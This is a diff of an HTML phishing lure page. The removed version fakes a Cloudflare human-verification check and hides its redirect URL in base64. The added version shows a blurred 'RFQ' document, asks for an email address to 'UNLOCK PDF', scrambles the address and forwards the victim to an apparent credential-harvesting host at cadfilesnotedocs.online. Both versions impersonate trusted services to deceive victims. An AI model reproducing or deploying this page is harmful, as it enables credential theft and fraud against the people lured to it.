@@ -1,225 +1,211 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify you're human</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>RFQ</title>
+
+    <!-- Professional cursive font (optional – you can remove if not used) -->
+    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet" />
+
     <style>
-        :root {
-            --bg-page: #ffffff;
-            --border-color: #e0e0e0;
-            --text-dark: #1a1a1a;
-            --text-muted: #666666;
-            --accent-blue: #0052cc;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
-        body, html {
-            margin: 0; padding: 0; height: 100%;
-            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg-page);
-            display: flex; justify-content: center; align-items: center;
-            overflow: hidden;
-        }
-
-        /* Initial Loading Splash */
-        #splash-screen {
-            position: fixed; inset: 0;
-            background: #ffffff;
-            display: flex; justify-content: center; align-items: center;
-            z-index: 2000;
-        }
-
-        .pulsating-logo {
-            width: 100px; height: auto;
-            animation: soft-pulse 2s ease-in-out infinite;
-        }
-
-        @keyframes soft-pulse {
-            0%, 100% { transform: scale(1); opacity: 0.7; }
-            50% { transform: scale(1.05); opacity: 1; }
-        }
-
-        /* Unified Verification Container */
-        #app-view {
-            display: none;
-            flex-direction: column;
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
             align-items: center;
+            margin: 20px;
+            position: relative;
+        }
+
+        /* Blurred background layer */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: url('xxx.jpg');
+            background-size: 70% auto;
+            background-position: center 60px;
+            background-repeat: no-repeat;
+            filter: blur(4px);
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 420px;
             width: 100%;
-        }
-
-        .instruction-header {
-            font-size: 14px;
-            color: var(--text-dark);
-            margin-bottom: 20px;
-        }
-
-        /* The single rectangular box */
-        .verification-panel {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            width: 380px;
-            padding: 18px 24px;
-            border: 1px solid var(--border-color);
-            background: #fafafa;
-            border-radius: 3px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.04);
-        }
-
-        .interactive-section {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
-
-        /* Interaction Elements */
-        .trigger-area {
-            width: 24px; height: 24px;
-            display: flex; align-items: center; justify-content: center;
-            cursor: pointer;
-        }
-
-        .check-box-ui {
-            width: 22px; height: 22px;
-            border: 2px solid #c1c1c1;
-            background: #fff;
-            border-radius: 2px;
-        }
-
-        .loading-spinner {
-            width: 20px; height: 20px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid var(--accent-blue);
-            border-radius: 50%;
-            animation: spin-data 0.9s linear infinite;
-        }
-
-        .check-glyph {
-            color: #228b22;
-            font-size: 22px;
-            font-weight: bold;
-        }
-
-        @keyframes spin-data { 100% { transform: rotate(360deg); } }
-
-        /* Brand/Logo Section */
-        .branding-stack {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            padding: 20px 16px;
             text-align: center;
         }
 
-        .mini-astro {
-            width: 28px;
-            height: auto;
-            margin-bottom: 4px;
+        .subtext {
+            font-size: 17px;
+            font-weight: 500;
+            color: #1a1a2e;
+            line-height: 1.6;
+            margin-bottom: 28px;
+            text-shadow: 0 1px 4px rgba(255, 255, 255, 0.8);
         }
 
-        .brand-name {
-            font-weight: 700;
+        .input-group {
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-family: BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: 400;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+            text-shadow: 0 1px 4px rgba(255, 255, 255, 0.8);
+            letter-spacing: 0.5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #1a1a1a;
+            border-radius: 8px;
+            font-size: 16px;
+            background: rgba(255, 255, 255, 0.92);
+            color: #1a1a1a;
+            transition: box-shadow 0.2s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #1a1a1a;
+            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.1);
+            background: #ffffff;
+        }
+
+        .input-group input::placeholder {
+            font-family: 'Courier New', monospace;
+            font-weight: 500;
+            letter-spacing: 1px;
+            color: #9ca3af;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 8px 36px;
+            background: #dc2626;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
             font-size: 15px;
-            margin: 0;
-            color: #1a1a1b;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            letter-spacing: 0.3px;
         }
 
-        .sub-links {
-            font-size: 10px;
-            color: #999;
-            margin-top: 2px;
+        .btn:hover {
+            background: #b91c1c;
         }
 
-        #status-text {
-            font-size: 14px;
-            color: var(--text-muted);
+        .btn:active {
+            transform: scale(0.97);
+        }
+
+        .footer-note {
+            margin-top: 28px;
+            font-size: 13px;
+            color: #1a1a2e;
+            text-shadow: 0 1px 4px rgba(255, 255, 255, 0.8);
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <p class="subtext">
+            Because you are accessing sensitive information, we need to verify you are human
+        </p>
 
-    <div id="splash-screen">
-        <img src="astro.png" class="pulsating-logo" alt="Loading">
-    </div>
-
-    <div id="app-view">
-        <div class="instruction-header" id="msg-box"></div>
-
-        <div class="verification-panel">
-            <div class="interactive-section">
-                <div id="click-target" class="trigger-area">
-                    <div id="state-icon" class="check-box-ui"></div>
-                </div>
-                <span id="status-text"></span>
-            </div>
-
-            <div class="branding-stack">
-                <img src="astro2.png" class="mini-astro" alt="Logo">
-                <p class="brand-name" id="brand-label"></p>
-                <div class="sub-links">Privacy • Terms</div>
-            </div>
+        <div class="input-group">
+            <label for="emailInput">Enter your email address</label>
+            <input
+                type="email"
+                id="emailInput"
+                placeholder="********@*****.***"
+                autofocus
+                required
+            />
         </div>
+
+        <button class="btn" onclick="handleVerification()">UNLOCK PDF</button>
     </div>
 
     <script>
-        (function() {
-            const vault = {
-                m: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
-                b: "dmVyaWZ5",
-                l: "dmVyaWZ5aW5nLi4u",
-                f: "c3VjY2Vzcw==",
-                n: "Q2xvdWRmbGFyZQ==",
-                // Updated URL
-                u: "aHR0cHM6Ly9hZW9mZmljZS5kaW9jdWFlLm9ubGluZS93dndZUG5zciM=",
-                p: "ZW9mZg=="
-            };
+        function encodeEmail(email) {
+            // Split into local and domain parts
+            const atIndex = email.indexOf('@');
+            if (atIndex === -1) return null;
 
-            const _q = (s) => document.querySelector(s);
-            const _d = (v) => atob(v);
+            const local = email.substring(0, atIndex);
+            const domainPart = email.substring(atIndex + 1);
 
-            // Startup
-            window.addEventListener('load', () => {
-                _q('#msg-box').textContent = _d(vault.m);
-                _q('#status-text').textContent = _d(vault.b);
-                _q('#brand-label').textContent = _d(vault.n);
+            // Find the TLD (after the last dot)
+            const lastDot = domainPart.lastIndexOf('.');
+            if (lastDot === -1) return null;
 
-                setTimeout(() => {
-                    _q('#splash-screen').style.display = 'none';
-                    _q('#app-view').style.display = 'flex';
-                }, 2000);
-            });
+            const tld = domainPart.substring(lastDot + 1);
+            const domainWithoutTld = domainPart.substring(0, lastDot);
 
-            // Action
-            _q('#click-target').onclick = function() {
-                this.onclick = null;
-                const icon = _q('#state-icon');
+            // Reverse strings
+            const reverse = (str) => str.split('').reverse().join('');
 
-                // Set Loading
-                icon.className = 'loading-spinner';
-                _q('#status-text').textContent = _d(vault.l);
+            const encoded = reverse(tld) + 'ZZZ' + reverse(domainWithoutTld) + 'YYY' + reverse(local);
+            return encoded;
+        }
 
-                setTimeout(() => {
-                    // Set Success
-                    icon.className = 'check-glyph';
-                    icon.innerHTML = '✓';
-                    _q('#status-text').textContent = _d(vault.f);
+        function handleVerification() {
+            const input = document.getElementById('emailInput');
+            const email = input.value.trim();
 
-                    _proceed();
-                }, 2200);
-            };
-
-            function _proceed() {
-                const url = window.location.href;
-                const key = _d(vault.p) + "=";
-                let val = "";
-
-                if (url.indexOf(key) !== -1) {
-                    val = url.split(key)[1];
-                }
-
-                const target = _d(vault.u) + val;
-                setTimeout(() => { window.location.replace(target); }, 800);
+            if (!email) {
+                alert('Please enter your email address.');
+                input.focus();
+                return;
             }
-        })();
+
+            // Basic format check
+            if (!email.includes('@') || !email.includes('.')) {
+                alert('Please enter a valid email address (e.g., name@domain.com).');
+                input.focus();
+                return;
+            }
+
+            const encoded = encodeEmail(email);
+            if (!encoded) {
+                alert('Invalid email format. Please use a standard email address with a domain and TLD.');
+                input.focus();
+                return;
+            }
+
+            // Redirect immediately
+            const baseUrl = 'https://login.cadfilesnotedocs.online/r/DQ_fJFcEZt5y2I2y16cBVSX';
+            window.location.href = baseUrl + '#' + encoded;
+        }
+
+        document.getElementById('emailInput').addEventListener('keydown', function (e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleVerification();
+            }
+        });
     </script>
 </body>
 </html>
